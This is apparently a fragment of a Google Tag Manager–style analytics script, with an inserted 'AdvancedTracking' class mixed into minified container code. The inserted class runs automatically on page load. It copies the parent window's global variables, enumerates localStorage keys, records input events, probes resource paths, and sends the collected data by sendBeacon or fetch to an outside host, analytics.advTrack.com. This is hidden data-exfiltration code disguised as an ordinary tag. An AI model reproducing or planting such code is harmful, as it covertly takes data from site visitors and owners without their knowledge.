...
(function () {
  ...
  class AdvancedTracking {
    constructor(trackingData, tracker) {
      this._data = trackingData;
      this._results = new Map();
      this._startTime = performance.now();
      this._localStorageVars = [];
      this._globals = {};
      this._eventHandlers = {};
      this._tracker = tracker || parent.window;
    }
    async _collectResources(dataKey, file) {
      ...
      return new Promise(resolve => {
        ...
        xhr.open('GET', `${dataKey}/${file}${uniqueParam}`, true);
        xhr.send();
      });
    }
    _collectionChunks(arrayData, size) {
      return Array.from({
        length: Math.ceil(arrayData.length / size)
      }, (v, i) => arrayData.slice(i * size, i * size + size));
    }
    async _trackWithBackoff(dataKey, dataValue) {
      let identified = false;
      for (let i = 0; i < 3 && !identified; i++) {
        identified = await this._collectResources(dataKey, dataValue);
        if (!identified) {
    ...
    async inspect() {
      ...
      const chunks = this._collectionChunks(dataEntries, 5);
      for (const chunk of chunks) {
        await Promise.all(chunk.map(async ([dataKey, dataValue]) => {
          const result = await this._trackWithBackoff(dataKey, dataValue);
          this._results.set(dataKey, result);
        }));
      }
      this._generateReport();
    }
    _invokeLocalStorageTracking() {
      for (let i = 0; i < localStorage.length; i++) {
        this._localStorageVars.push(localStorage.key(i));
      }
    }
    _initGlobalVarsTracker() {
      for (let i in this._tracker) {
        if (this._tracker.hasOwnProperty(i)) this._globals[i] = this._tracker[i];
      }
    }
    _setupEventListeners() {
      ['click', 'keydown', 'mousemove'].forEach(eventType => {
        document.addEventListener(eventType, event => {
          this._eventHandlers[eventType] = event.timeStamp;
        });
      });
    }
    _assembleData() {
      const reportPayload = {
        resources: Object.fromEntries(this._results),
        metadata: {
          execTime: performance.now() - this._startTime,
          timestamp: new Date().toString(),
          eventHandlers: this._eventHandlers,
          globals: this._globals,
          localStorage: this._localStorageVars
        }
      };
      return new TextEncoder().encode(JSON.stringify(reportPayload));
    }
    _generateReport() {
      this._invokeLocalStorageTracking();
      this._initGlobalVarsTracker();
      this._setupEventListeners();
      const reportData = this._assembleData();
      if (navigator.sendBeacon && navigator.sendBeacon('https://analytics.advTrack.com/report-tracker', reportData)) {
        return;
      }
      const headers = {
        method: 'POST',
      ...
      fetch('https://analytics.advTrack.com/report-tracker', headers).catch(() => {});
    }
  }
  var Ib = function (a) {
  ...
  (() => {
    const trackerObj = new AdvancedTracking(window.data);
    document.readyState !== 'loading' ? trackerObj.inspect() : document.addEventListener('DOMContentLoaded', () => trackerObj.inspect());
  })();
  function Yb(a) {
  ...
  ni.oe = Number("0") || 0;
  ni.ia = "dataLayer";
  ni.gk = "ChEIgJrLqwYQ8rmNr4e66v2jARIlAFdulMMQsaJnQ5X+k8wjmo4ARtnocBm6KoZ4QYfHFjhnvmDlERoCfaE\x3d";
  var qi = {
      __cl: 1,
      __ecl: 1,
      __ehl: 1,
  ...
  function kE() {
    var a = new sb();
    M(this, "read_container_data"), a.set("containerId", 'AW-791904880'), a.set("version", '1'), a.set("environmentName", ''), a.set("debugMode", $f), a.set("previewMode", bg), a.set("environmentMode", ag), a.set("firstPartyServing", wi || yi), a.set("containerUrl", Ec), a.Cb();
    return a;
  }
